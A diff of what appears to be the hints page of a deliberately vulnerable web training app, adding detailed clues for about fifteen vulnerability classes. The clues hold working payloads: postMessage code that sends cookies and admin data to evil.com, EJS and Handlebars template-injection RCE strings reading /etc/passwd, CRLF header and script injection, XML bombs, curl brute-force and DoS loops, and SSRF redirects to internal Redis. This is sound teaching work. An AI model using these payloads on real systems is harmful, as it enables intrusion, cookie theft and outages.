+                    Memory leaks happen when a server allocates memory but NEVER releases it. Imagine an endpoint that creates a 10KB array on every request but never deletes it. After 10,000 requests = 100MB leaked. After 100,000 = 1GB! Eventually the server runs out of RAM and crashes. This is a Denial of Service attack using resource exhaustion.
                 </div>
                 <div class="hint-box">
-                    /api/memory-leak pushes 10KB arrays. Send thousands of requests to crash server.
+                    Code like: let globalArray = []; app.get('/leak', () => globalArray.push(new Array(10000))) creates unbounded growth. Each request adds 10KB that's never freed. Spam this endpoint to consume all server memory and crash it.
                 </div>
-                <p><strong>Endpoints:</strong> <span class="endpoint-badge">GET /api/memory-leak</span></p>
+                <div class="challenge-box">
+                    Can you crash the server by exhausting its memory? Try sending thousands of requests to /api/memory-leak. Monitor the server's memory usage. How many requests does it take before it becomes unresponsive?
+                </div>
+                <p><strong>Affected Endpoints:</strong></p>
+                <span class="endpoint-badge">GET /api/memory-leak</span>
+                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
+                <div class="expanded-content">
+                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
+                    <p>• Write script: for i in {1..10000}; do curl /api/memory-leak; done</p>
+                    <p>• Monitor: watch "ps aux | grep node" to see memory grow</p>
+                    <p>• Each request adds ~10KB, 10,000 requests = 100MB leaked</p>
+                    <p>• Server crashes when RAM full (varies by system, usually ~1-2GB)</p>
+                    <p>• Real impact: DoS entire website, requires restart to recover</p>
+                </div>
             </div>
 
             <div class="vuln-card">
@@ -1917,12 +2165,25 @@ const headers = `To: ${userInput}\nFrom: noreply@site.com`;
                     <h2 class="vuln-title">DOM Clobbering</h2>
                 </div>
                 <div class="vuln-description">
-                    HTML id/name attributes overwrite JavaScript globals. Exploit client-side validation.
+                    HTML elements with id or name attributes automatically become JavaScript globals! If code checks window.isAdmin and you inject HTML with id="isAdmin", your HTML element OVERWRITES the JavaScript variable. This can bypass client-side security checks. Example: &lt;input name="isAdmin" value="true"&gt; makes window.isAdmin.value = "true"!
                 </div>
                 <div class="hint-box">
-                    /api/dom-test renders id= parameter. <input name="isAdmin" value="true"> clobbers window.isAdmin
+                    DOM = Document Object Model (HTML as JavaScript objects). Clobbering = overwriting. Browser creates: &lt;div id="config"&gt; → window.config = that div. If code expects window.config.apiURL, inject &lt;a id="config" href="http://evil.com"&gt; → config.href overwrites it!
                 </div>
-                <p><strong>Endpoints:</strong> <span class="endpoint-badge">GET /api/dom-test</span></p>
+                <div class="challenge-box">
+                    Can you exploit /api/dom-test by injecting HTML that clobbers JavaScript variables? Try injecting elements with strategic id/name attributes. What client-side checks can you bypass? Can you change where the app sends data?
+                </div>
+                <p><strong>Affected Endpoints:</strong></p>
+                <span class="endpoint-badge">GET /api/dom-test</span>
+                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
+                <div class="expanded-content">
+                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
+                    <p>• Inject: &lt;input name="isAdmin" value="true"&gt;</p>
+                    <p>• Inject: &lt;a id="config" href="http://attacker.com"&gt;&lt;/a&gt;</p>
+                    <p>• Inject: &lt;form name="credentials"&gt;&lt;input name="apiKey" value="stolen"&gt;&lt;/form&gt;</p>
+                    <p>• Check if code uses: if (window.isAdmin) or if (config.apiURL)</p>
+                    <p>• Impact: bypass auth checks, redirect API calls, XSS in some cases</p>
+                </div>
             </div>
 
             <div class="vuln-card">
@@ -1932,12 +2193,25 @@ const headers = `To: ${userInput}\nFrom: noreply@site.com`;
                     <h2 class="vuln-title">PostMessage XSS</h2>
                 </div>
                 <div class="vuln-description">
-                    window.postMessage listener evaluates messages. Cross-origin XSS possible.
+                    window.postMessage() lets different browser windows/tabs communicate across origins. Pages use addEventListener('message') to receive messages. The DANGER: if the listener doesn't check message.origin and blindly executes message.data, attackers can send malicious code from ANY website! Example: page does eval(event.data) — attacker sends "fetch('/api/admin').then(r=>r.json()).then(d=>fetch('http://evil.com?'+JSON.stringify(d)))"
                 </div>
                 <div class="hint-box">
-                    /api/postmessage has addEventListener that calls eval(). Send malicious postMessage from any origin.
+                    Vulnerable code: window.addEventListener('message', (e) => eval(e.data)). ANY website can: window.open('target.com').postMessage('alert(document.cookie)', '*'). The * means send to any origin! Proper code checks: if (e.origin !== 'https://trusted.com') return;
                 </div>
-                <p><strong>Endpoints:</strong> <span class="endpoint-badge">GET /api/postmessage</span></p>
+                <div class="challenge-box">
+                    Can you exploit /api/postmessage by sending malicious postMessage? Create a page that sends JavaScript code to the target. What can you execute? Can you steal cookies or call authenticated APIs?
+                </div>
+                <p><strong>Affected Endpoints:</strong></p>
+                <span class="endpoint-badge">GET /api/postmessage</span>
+                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
+                <div class="expanded-content">
+                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
+                    <p>• Attacker page: window.opener.postMessage('alert(1)', '*')</p>
+                    <p>• Or: targetWindow.postMessage('fetch("http://evil.com?c="+document.cookie)', '*')</p>
+                    <p>• Check if page validates: event.origin === 'https://trusted.com'</p>
+                    <p>• If no origin check, you can send from anywhere</p>
+                    <p>• Real impact: full XSS, steal tokens, perform actions as user</p>
+                </div>
             </div>
 
             <div class="vuln-card">
@@ -1947,12 +2221,25 @@ const headers = `To: ${userInput}\nFrom: noreply@site.com`;
                     <h2 class="vuln-title">WebRTC IP Leak</h2>
                 </div>
                 <div class="vuln-description">
-                    WebRTC configuration leaks internal IPs even behind VPN/proxy.
+                    WebRTC enables video/voice calls in browsers by connecting peers directly. To establish connections, browsers reveal ALL network interfaces — including your REAL private IP (192.168.x.x) even when using VPN/Proxy! JavaScript can access this via RTCPeerConnection without permissions. Attackers use this to identify users behind anonymity tools and map internal networks.
                 </div>
                 <div class="hint-box">
-                    /api/webrtc-config provides STUN servers. Use to discover real IP addresses.
+                    WebRTC uses STUN servers to discover your IPs. Code: new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]}) reveals local IPs in ICE candidates. Even if you're behind VPN showing public IP 1.2.3.4, WebRTC leaks your real LAN IP 192.168.1.100!
                 </div>
-                <p><strong>Endpoints:</strong> <span class="endpoint-badge">GET /api/webrtc-config</span></p>
+                <div class="challenge-box">
+                    Can you discover the real IP addresses using /api/webrtc-config? Create JavaScript that establishes a WebRTC connection and logs all ICE candidates. What local IPs are revealed? How does this bypass VPN protection?
+                </div>
+                <p><strong>Affected Endpoints:</strong></p>
+                <span class="endpoint-badge">GET /api/webrtc-config</span>
+                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
+                <div class="expanded-content">
+                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
+                    <p>• Code: let pc = new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]})</p>
+                    <p>• pc.onicecandidate = (e) => console.log(e.candidate.address)</p>
+                    <p>• Creates data channel to trigger ICE gathering: pc.createDataChannel('')</p>
+                    <p>• ICE candidates contain: 192.168.x.x, 10.x.x.x, real public IP</p>
+                    <p>• Impact: deanonymize VPN users, fingerprint internal network</p>
+                </div>
             </div>
 
             <div class="vuln-card">
@@ -1962,12 +2249,25 @@ const headers = `To: ${userInput}\nFrom: noreply@site.com`;
                     <h2 class="vuln-title">CRLF Injection</h2>
                 </div>
                 <div class="vuln-description">
-                    Inject \r\n to add HTTP headers. Set cookies, cause redirects, split responses.
+                    HTTP responses separate headers from body using \r\n\r\n (Carriage Return Line Feed). If user input goes into a header without validation, attackers inject %0d%0a (URL-encoded \r\n) to INSERT NEW HEADERS or even write RESPONSE BODY! Example: inject Set-Cookie: admin=true or Location: http://evil.com to set cookies or redirect. This is HTTP Response Splitting.
                 </div>
                 <div class="hint-box">
-                    /api/header-inject sets custom header without sanitization. Try: value=%0d%0aSet-Cookie:admin=true
+                    Server code: res.setHeader('X-Custom', req.query.value) without sanitizing. Attacker sends: ?value=test%0d%0aSet-Cookie:admin=true → response becomes: X-Custom: test\r\nSet-Cookie:admin=true. Now you've injected a cookie! Double CRLF (%0d%0a%0d%0a) lets you inject response body for XSS!
                 </div>
-                <p><strong>Endpoints:</strong> <span class="endpoint-badge">GET /api/header-inject</span></p>
+                <div class="challenge-box">
+                    Can you inject headers into /api/header-inject? Try adding %0d%0aSet-Cookie:admin=true or %0d%0aLocation:http://evil.com. What headers can you inject? Can you cause cache poisoning or XSS?
+                </div>
+                <p><strong>Affected Endpoints:</strong></p>
+                <span class="endpoint-badge">GET /api/header-inject</span>
+                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
+                <div class="expanded-content">
+                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
+                    <p>• Inject: value=%0d%0aSet-Cookie:admin=true;%20path=/</p>
+                    <p>• Inject: value=%0d%0aLocation:http://attacker.com</p>
+                    <p>• Inject body: value=%0d%0a%0d%0a&lt;script&gt;alert(1)&lt;/script&gt;</p>
+                    <p>• URL encode: \r = %0d, \n = %0a</p>
+                    <p>• Impact: set arbitrary cookies, redirect users, cache poison, XSS</p>
+                </div>
             </div>
 
             <div class="vuln-card">
@@ -1977,12 +2277,27 @@ const headers = `To: ${userInput}\nFrom: noreply@site.com`;
                     <h2 class="vuln-title">Template Injection (Multiple)</h2>
                 </div>
                 <div class="vuln-description">
-                    Server-side template engines render user input. SSTI in EJS, Handlebars, XSLT.
+                    Template engines (EJS, Handlebars, Jinja2, XSLT) turn templates into HTML. They have special syntax like <%= code %> or {{ expression }} that EXECUTES on the server! If user input goes directly into templates without escaping, attackers inject template code for Remote Code Execution. Different from XSS because it runs on the SERVER, not browser!
                 </div>
                 <div class="hint-box">
-                    /api/render-template uses EJS. /api/template is Handlebars. /api/xslt for XSLT injection.
+                    Vulnerable: res.render('page', {name: req.query.name}) where template has &lt;%= name %&gt;. Attacker sends: ?name=&lt;%=process.mainModule.require('child_process').execSync('whoami')%&gt; to run shell commands! Each engine has unique syntax for RCE.
                 </div>
-                <p><strong>Endpoints:</strong> <span class="endpoint-badge">GET /api/render-template</span> <span class="endpoint-badge">GET /api/template</span> <span class="endpoint-badge">POST /api/xslt</span></p>
+                <div class="challenge-box">
+                    Can you achieve RCE via template injection? /api/render-template uses EJS, /api/template uses Handlebars, /api/xslt uses XSLT. Research each engine's exploit syntax. Can you read files? Execute commands?
+                </div>
+                <p><strong>Affected Endpoints:</strong></p>
+                <span class="endpoint-badge">GET /api/render-template</span>
+                <span class="endpoint-badge">GET /api/template</span>
+                <span class="endpoint-badge">POST /api/xslt</span>
+                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
+                <div class="expanded-content">
+                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
+                    <p>• EJS: &lt;%=process.mainModule.require('child_process').execSync('cat /etc/passwd').toString()%&gt;</p>
+                    <p>• Handlebars: {{#with "s" as |string|}}{{#with "e"}}{{lookup string.sub "constructor"}}{{/with}}{{/with}}</p>
+                    <p>• XSLT: &lt;xsl:value-of select="system-property('xsl:version')"/&gt; for info</p>
+                    <p>• Test: inject {{ 7*7 }} or <%= 7*7 %>, if output is 49 = vulnerable</p>
+                    <p>• Impact: full server RCE, read any file, reverse shell</p>
+                </div>
             </div>
 
             <div class="vuln-card">
@@ -1992,12 +2307,25 @@ const headers = `To: ${userInput}\nFrom: noreply@site.com`;
                     <h2 class="vuln-title">Session Puzzling</h2>
                 </div>
                 <div class="vuln-description">
-                    Multiple session sources (cookie, query, header). Server confused about which to use.
+                    Web apps might accept session identifiers from MULTIPLE sources: cookies, URL query strings (?session=abc), HTTP headers (X-Session-ID), POST body. If the server checks multiple sources without proper priority, attackers can confuse it by sending DIFFERENT session IDs in different places! This creates authentication state confusion and privilege escalation.
                 </div>
                 <div class="hint-box">
-                    /api/multi-session reads session from cookie AND query string. Exploit state confusion.
+                    Code like: let session = req.cookies.session || req.query.session || req.headers['x-session-id'] creates ambiguity. Send cookie with guest session + query parameter with admin session. Some middleware checks cookie (guest), other checks query (admin) → confused privilege escalation!
                 </div>
-                <p><strong>Endpoints:</strong> <span class="endpoint-badge">GET /api/multi-session</span></p>
+                <div class="challenge-box">
+                    Can you confuse /api/multi-session by sending different session IDs in cookie vs query string? Try: Cookie: session=guest123 while also adding ?session=admin456. Which one does the auth check? Which one grants access? Can you mix and match to gain admin?
+                </div>
+                <p><strong>Affected Endpoints:</strong></p>
+                <span class="endpoint-badge">GET /api/multi-session</span>
+                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
+                <div class="expanded-content">
+                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
+                    <p>• Send: Cookie: session=your_normal_session AND ?session=stolen_admin_session</p>
+                    <p>• Or: Cookie: session=guest AND X-Session-ID: admin_session_token</p>
+                    <p>• Try combinations: auth checks cookie but data fetch checks query param</p>
+                    <p>• Session fixation + puzzling: force victim to use your session ID</p>
+                    <p>• Impact: privilege escalation, access other user data, bypass auth</p>
+                </div>
             </div>
 
             <div class="vuln-card">
@@ -2007,12 +2335,25 @@ const headers = `To: ${userInput}\nFrom: noreply@site.com`;
                     <h2 class="vuln-title">API Keys in URLs</h2>
                 </div>
                 <div class="vuln-description">
-                    API keys passed as query parameters. Logged in history, referrer, proxy logs.
+                    API keys in URL query parameters (?apiKey=secret123) get logged EVERYWHERE: browser history, server logs, proxy logs, referrer headers when clicking external links, analytics tools, browser extensions. It's like writing your password on a postcard! Once in logs, keys remain forever. Anyone with log access (admins, attackers, third parties) can steal them.
                 </div>
                 <div class="hint-box">
-                    /api/data accepts ?apiKey= in URL. Keys leak everywhere - use POST body instead.
+                    GET /api/data?apiKey=sk_live_abc123 → logged in: Chrome history, nginx access.log, Cloudflare logs, Google Analytics, error tracking tools. If you visit external site, Referer header leaks full URL with key! Proper way: use Authorization header or POST body.
                 </div>
-                <p><strong>Endpoints:</strong> <span class="endpoint-badge">GET /api/data</span></p>
+                <div class="challenge-box">
+                    Can you find API keys in URL parameters on /api/data? Check your browser history after making requests. What other places might these keys leak to? How would you exploit leaked keys from referrer headers?
+                </div>
+                <p><strong>Affected Endpoints:</strong></p>
+                <span class="endpoint-badge">GET /api/data</span>
+                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
+                <div class="expanded-content">
+                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
+                    <p>• Check: chrome://history - see full URLs with keys</p>
+                    <p>• Server logs: tail -f /var/log/nginx/access.log shows ?apiKey=</p>
+                    <p>• Referer leak: page with ?apiKey=X links to external.com → external.com sees full URL in Referer</p>
+                    <p>• Third-party scripts: analytics, error tracking see full URL</p>
+                    <p>• Fix: use Authorization: Bearer token or POST body with key</p>
+                </div>
             </div>
 
             <div class="vuln-card">
@@ -2022,12 +2363,26 @@ const headers = `To: ${userInput}\nFrom: noreply@site.com`;
                     <h2 class="vuln-title">Billion Laughs / XML Bomb</h2>
                 </div>
                 <div class="vuln-description">
-                    Recursive entity expansion causes exponential memory usage. DoS via XML.
+                    XML supports entities (variables): &amp;lol1; = "lol". You can nest them: &amp;lol2; = "&amp;lol1;&amp;lol1;" (2 lols), &amp;lol3; = "&amp;lol2;&amp;lol2;" (4 lols), continuing to &amp;lol9; = billions of "lol"s! When XML parser expands these, it uses EXPONENTIAL memory. A tiny 1KB XML becomes 3GB in memory, crashing the server. This is a Denial of Service attack!
                 </div>
                 <div class="hint-box">
-                    /api/xml-parse and /api/xml-blind accept XML. Try lol1, lol2... lol9 entity expansion.
+                    Attack XML: &lt;!ENTITY lol1 "lol"&gt; &lt;!ENTITY lol2 "&amp;lol1;&amp;lol1;"&gt; ... &lt;!ENTITY lol9 "&amp;lol8;&amp;lol8;"&gt; then use &amp;lol9;. Parser expands: 2^9 = 512 lol1s. With 9 levels of 10 entities each = 10^9 (billion) expansions! Server runs out of RAM.
                 </div>
-                <p><strong>Endpoints:</strong> <span class="endpoint-badge">POST /api/xml-parse</span> <span class="endpoint-badge">POST /api/xml-blind</span></p>
+                <div class="challenge-box">
+                    Can you crash /api/xml-parse with a billion laughs attack? Create XML with nested entities that expand exponentially. How many levels before the server becomes unresponsive? How small can you make the payload?
+                </div>
+                <p><strong>Affected Endpoints:</strong></p>
+                <span class="endpoint-badge">POST /api/xml-parse</span>
+                <span class="endpoint-badge">POST /api/xml-blind</span>
+                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
+                <div class="expanded-content">
+                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
+                    <p>• XML payload: &lt;!DOCTYPE data [&lt;!ENTITY lol0 "lol"&gt;&lt;!ENTITY lol1 "&amp;lol0;&amp;lol0;&amp;lol0;..."&gt;...]&gt;</p>
+                    <p>• Each level multiplies by 10, 9 levels = billion expansions</p>
+                    <p>• Final reference: &lt;data&gt;&amp;lol9;&lt;/data&gt;</p>
+                    <p>• Payload size: ~1KB, memory usage: 3GB+</p>
+                    <p>• Defense: disable entity expansion, set expansion limits</p>
+                </div>
             </div>
 
             <div class="vuln-card">
@@ -2037,12 +2392,25 @@ const headers = `To: ${userInput}\nFrom: noreply@site.com`;
                     <h2 class="vuln-title">Integer Overflow</h2>
                 </div>
                 <div class="vuln-description">
-                    Large numbers wrap around. Exploit for free items, negative balances.
+                    Integers have maximum values. In 32-bit systems: 2,147,483,647 is max. Add 1 and it WRAPS AROUND to -2,147,483,648! This is integer overflow. In web apps: transfer $1 when balance calculation overflows, you might get $2 billion! Or buy items with quantity -1 (wraps to huge positive) for negative price (gaining money instead of spending).
                 </div>
                 <div class="hint-box">
-                    /api/calculate adds without bounds checking. Try INT_MAX values to cause wraparound.
+                    Vulnerable code: balance = balance + amount without checking overflow. Send amount = INT_MAX, balance wraps to negative! Or: totalPrice = quantity * price without validation. Send quantity = 2147483647, price = 2 = overflow = negative/zero price!
                 </div>
-                <p><strong>Endpoints:</strong> <span class="endpoint-badge">POST /api/calculate</span></p>
+                <div class="challenge-box">
+                    Can you cause integer overflow in /api/calculate? Try sending very large numbers like 2147483647. What happens when you add to this? Can you make totalPrice become negative? How could you get free items?
+                </div>
+                <p><strong>Affected Endpoints:</strong></p>
+                <span class="endpoint-badge">POST /api/calculate</span>
+                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
+                <div class="expanded-content">
+                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
+                    <p>• Try: quantity = 2147483647 (INT_MAX), price = 2</p>
+                    <p>• Result: 2147483647 * 2 = overflow = negative or very small</p>
+                    <p>• Try: balance = 2147483647, add 1 = wraps to -2147483648</p>
+                    <p>• JavaScript: numbers are 64-bit floats, but server might use 32-bit</p>
+                    <p>• Real impact: free purchases, balance manipulation, bypass limits</p>
+                </div>
             </div>
 
             <div class="vuln-card">
@@ -2052,12 +2420,26 @@ const headers = `To: ${userInput}\nFrom: noreply@site.com`;
                     <h2 class="vuln-title">No Rate Limiting</h2>
                 </div>
                 <div class="vuln-description">
-                    Zero throttling on any endpoint. Brute force, DoS, credential stuffing unrestricted.
+                    Rate limiting restricts how many requests a user can make (e.g., 100 requests per minute). Without it, attackers can send UNLIMITED requests! This enables: brute force attacks (try all PINs 0000-9999 in seconds), credential stuffing (test leaked password lists), DoS (overwhelm server), scraping entire databases. It's like a bank with no daily withdrawal limit.
                 </div>
                 <div class="hint-box">
-                    /api/brute-force-endpoint has no rate limit. Try every PIN from 0000-9999 in seconds.
+                    No rate limit means: write script to test every possible password, iterate through all user IDs, overwhelm server with requests. Example: 4-digit PIN = 10,000 attempts. At 100 requests/second = cracked in 100 seconds! Proper apps limit to 5 attempts before lockout.
                 </div>
-                <p><strong>Endpoints:</strong> <span class="endpoint-badge">POST /api/brute-force-endpoint</span> <span class="endpoint-badge">ALL ENDPOINTS</span></p>
+                <div class="challenge-box">
+                    Can you brute force /api/brute-force-endpoint? Write a script to test all 4-digit PINs (0000-9999). How fast can you iterate? What other endpoints have no rate limiting? Can you enumerate all users?
+                </div>
+                <p><strong>Affected Endpoints:</strong></p>
+                <span class="endpoint-badge">POST /api/brute-force-endpoint</span>
+                <span class="endpoint-badge">ALL ENDPOINTS</span>
+                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
+                <div class="expanded-content">
+                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
+                    <p>• Script: for i in {0000..9999}; do curl -X POST /api/login -d "pin=$i"; done</p>
+                    <p>• Use tools: hydra, burp intruder, custom Python script</p>
+                    <p>• Test user enumeration: /api/user/1, /api/user/2, ... /api/user/10000</p>
+                    <p>• DoS: while true; do curl /api/heavy-endpoint; done (overwhelm server)</p>
+                    <p>• Impact: account takeover, data scraping, DoS, password cracking</p>
+                </div>
             </div>
 
             <div class="vuln-card">
@@ -2067,12 +2449,25 @@ const headers = `To: ${userInput}\nFrom: noreply@site.com`;
                     <h2 class="vuln-title">Weak Password Policy</h2>
                 </div>
                 <div class="vuln-description">
-                    No password requirements. "a" is valid password. No complexity checks.
+                    Password strength is critical! Without enforcement, users choose: "123456", "password", "admin", "abc", even single letter "a"! These are instantly crackable with dictionary attacks or brute force. A proper policy requires: minimum 8 characters, mix of uppercase/lowercase/numbers/symbols, reject common passwords. No policy = every account is vulnerable.
                 </div>
                 <div class="hint-box">
-                    /api/register accepts any password. Database shows: "password123", "admin", "123456"
+                    Vulnerable apps accept any string as password. Check database: SELECT password FROM users → see "admin", "123456", "password", "a". Attackers use lists of most common passwords (rockyou.txt has 14 million). Without policy, 10-30% of accounts use top 100 passwords!
                 </div>
-                <p><strong>Endpoints:</strong> <span class="endpoint-badge">POST /api/register</span></p>
+                <div class="challenge-box">
+                    Can you register accounts with weak passwords on /api/register? Try "a", "123", "admin". What's the minimum length accepted? Can you see other users' weak passwords? How would you exploit this with a dictionary attack?
+                </div>
+                <p><strong>Affected Endpoints:</strong></p>
+                <span class="endpoint-badge">POST /api/register</span>
+                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
+                <div class="expanded-content">
+                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
+                    <p>• Test registration: password="a" - if accepted, no policy</p>
+                    <p>• Common passwords list: admin, password, 123456, qwerty, welcome</p>
+                    <p>• Tools: hashcat, john the ripper with rockyou.txt wordlist</p>
+                    <p>• Check database for weak hashes: md5, sha1 without salt</p>
+                    <p>• Impact: mass account compromise via dictionary/brute force</p>
+                </div>
             </div>
 
             <div class="vuln-card">
@@ -2082,12 +2477,25 @@ const headers = `To: ${userInput}\nFrom: noreply@site.com`;
                     <h2 class="vuln-title">Unicode Normalization Bypass</h2>
                 </div>
                 <div class="vuln-description">
-                    Different Unicode representations of same character. Bypass filters with ℕ𝕌𝕃𝕃
+                    Unicode has multiple ways to represent the SAME character! Example: "é" can be: single character é (U+00E9) OR letter e + combining accent (U+0065 + U+0301). These look identical but are different bytes! Filters checking for "script" won't catch "𝕤𝕔𝕣𝕚𝕡𝕥" (mathematical bold). This bypasses blocklists, XSS filters, and SQL injection protections.
                 </div>
                 <div class="hint-box">
-                    /api/normalize shows how characters change. Use to bypass blocklists and WAFs.
+                    Normalization converts variants to standard form. If filter checks BEFORE normalization but app uses AFTER: bypass! Example: blocklist checks for "<script>", you send "<𝕤𝕔𝕣𝕚𝕡𝕥>", it normalizes to "<script>" after check. Also: null bytes U+0000, zero-width spaces, RTL overrides.
                 </div>
-                <p><strong>Endpoints:</strong> <span class="endpoint-badge">GET /api/normalize</span></p>
+                <div class="challenge-box">
+                    Can you bypass filters on /api/normalize using Unicode tricks? Try sending blocked keywords in different Unicode representations. What about "admin" (Latin fullwidth) instead of "admin"? How does the server normalize input?
+                </div>
+                <p><strong>Affected Endpoints:</strong></p>
+                <span class="endpoint-badge">GET /api/normalize</span>
+                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
+                <div class="expanded-content">
+                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
+                    <p>• Try: 𝕤𝕔𝕣𝕚𝕡𝕥 (math bold) instead of "script"</p>
+                    <p>• Try: é (e + combining accent) instead of é</p>
+                    <p>• Try: ａｄｍｉｎ (fullwidth) instead of "admin"</p>
+                    <p>• Check: tool converts your input, compare before/after</p>
+                    <p>• Impact: bypass WAF, XSS filters, SQL blocklists, authentication</p>
+                </div>
             </div>
 
             <div class="vuln-card">
@@ -2097,12 +2505,25 @@ const headers = `To: ${userInput}\nFrom: noreply@site.com`;
                     <h2 class="vuln-title">Server-Side Includes (SSI)</h2>
                 </div>
                 <div class="vuln-description">
-                    <!--#include file=""--> directives processed. Include arbitrary files.
+                    SSI is an old server technology that processes HTML COMMENTS with special directives. When server sees special comment, it EXECUTES commands! This is like server-side template injection but using HTML comment syntax. Attackers inject SSI directives to include files, execute commands, or leak environment variables.
                 </div>
                 <div class="hint-box">
-                    /api/ssi renders SSI directives. Try <!--#include file="/etc/passwd"-->
+                    SSI syntax uses HTML comments with # directives. Common payloads: include file to read files, exec cmd to run shell commands, echo var to leak environment variables. Vulnerable if server processes .shtml or has SSI enabled.
                 </div>
-                <p><strong>Endpoints:</strong> <span class="endpoint-badge">GET /api/ssi</span></p>
+                <div class="challenge-box">
+                    Can you exploit /api/ssi with Server-Side Includes? Try injecting SSI directives in your input. Can you include files? Execute commands? What sensitive data can you access?
+                </div>
+                <p><strong>Affected Endpoints:</strong></p>
+                <span class="endpoint-badge">GET /api/ssi</span>
+                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
+                <div class="expanded-content">
+                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
+                    <p>• Test detection: send comment with # and check if processed</p>
+                    <p>• Try different encodings to bypass filters</p>
+                    <p>• Check response for: [an error occurred while processing this directive]</p>
+                    <p>• Works on: Apache with mod_include, IIS with SSI enabled</p>
+                    <p>• Impact: RCE, file disclosure, environment variable leak</p>
+                </div>
             </div>
 
             <div class="vuln-card">
@@ -2112,12 +2533,25 @@ const headers = `To: ${userInput}\nFrom: noreply@site.com`;
                     <h2 class="vuln-title">DNS Rebinding</h2>
                 </div>
                 <div class="vuln-description">
-                    Domain resolves to public IP then switches to internal. Bypass SSRF protections.
+                    DNS rebinding exploits how browsers cache DNS lookups. Attacker controls a domain that FIRST resolves to public IP (passes SSRF checks), then CHANGES to internal IP (127.0.0.1 or 192.168.x.x) seconds later! Browser's same-origin policy thinks it's still the same domain, allowing access to internal services that were supposedly blocked.
                 </div>
                 <div class="hint-box">
-                    /api/internal-network shows internal services. Use DNS rebinding to access them.
+                    Attack flow: Server checks attacker.com → resolves to 1.2.3.4 (public IP, allowed). Server makes request. Meanwhile, attacker changes DNS: attacker.com now = 127.0.0.1. Browser cache expires, new request goes to localhost! This bypasses "no internal IPs" filters because DNS check was done earlier.
                 </div>
-                <p><strong>Endpoints:</strong> <span class="endpoint-badge">GET /api/internal-network</span></p>
+                <div class="challenge-box">
+                    Can you use DNS rebinding to access internal services on /api/internal-network? You'll need control of a domain with very low TTL. How would you exploit this to access localhost:6379 (Redis) or other internal services?
+                </div>
+                <p><strong>Affected Endpoints:</strong></p>
+                <span class="endpoint-badge">GET /api/internal-network</span>
+                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
+                <div class="expanded-content">
+                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
+                    <p>• Setup: register domain, set DNS TTL = 0 (no caching)</p>
+                    <p>• First response: A record = your public IP (pass SSRF check)</p>
+                    <p>• After delay: change A record to 127.0.0.1 or 192.168.1.1</p>
+                    <p>• Tools: singularity, whonow (DNS rebinding frameworks)</p>
+                    <p>• Impact: access internal services, bypass SSRF protections</p>
+                </div>
             </div>
 
             <div class="vuln-card">
@@ -2127,12 +2561,26 @@ const headers = `To: ${userInput}\nFrom: noreply@site.com`;
                     <h2 class="vuln-title">SSRF via Redirect</h2>
                 </div>
                 <div class="vuln-description">
-                    Follows redirects without validation. Chain SSRF through legitimate domains.
+                    Servers follow HTTP redirects automatically. SSRF filters might check the INITIAL URL (https://evil.com/redirect) but not the REDIRECT TARGET! Attacker's server responds: "302 Found, Location: http://127.0.0.1:6379". The victim server follows the redirect to internal services, bypassing URL validation that only checked the first hop.
                 </div>
                 <div class="hint-box">
-                    /api/follow-redirect and /api/external-redirect follow any URL. Redirect to internal IPs.
+                    Attack: victim checks evil.com (external, allowed) → makes request → evil.com returns: HTTP 302, Location: http://localhost:6379/CONFIG%20GET%20* → victim follows redirect to internal Redis! Filter only validated first URL, not redirect chain.
                 </div>
-                <p><strong>Endpoints:</strong> <span class="endpoint-badge">GET /api/follow-redirect</span> <span class="endpoint-badge">GET /api/external-redirect</span></p>
+                <div class="challenge-box">
+                    Can you exploit /api/follow-redirect or /api/external-redirect? Setup a server that redirects to internal IPs. What internal services can you reach? Can you chain multiple redirects to bypass deeper filters?
+                </div>
+                <p><strong>Affected Endpoints:</strong></p>
+                <span class="endpoint-badge">GET /api/follow-redirect</span>
+                <span class="endpoint-badge">GET /api/external-redirect</span>
+                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
+                <div class="expanded-content">
+                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
+                    <p>• Setup redirect server: app.get('/r', (req,res) => res.redirect('http://127.0.0.1:6379'))</p>
+                    <p>• Or use services: bit.ly, tinyurl with internal IP</p>
+                    <p>• Test: curl -L http://yourserver.com/redirect (follows to internal)</p>
+                    <p>• Chain redirects: evil.com → evil2.com → 127.0.0.1 (bypass multiple checks)</p>
+                    <p>• Impact: full SSRF, access internal APIs/databases/cloud metadata</p>
+                </div>
             </div>
 
             <div class="vuln-card">
@@ -2142,12 +2590,25 @@ const headers = `To: ${userInput}\nFrom: noreply@site.com`;
                     <h2 class="vuln-title">SVG XSS / XXE</h2>
                 </div>
                 <div class="vuln-description">
-                    SVG files can contain JavaScript and XML entities. Upload for XSS/XXE.
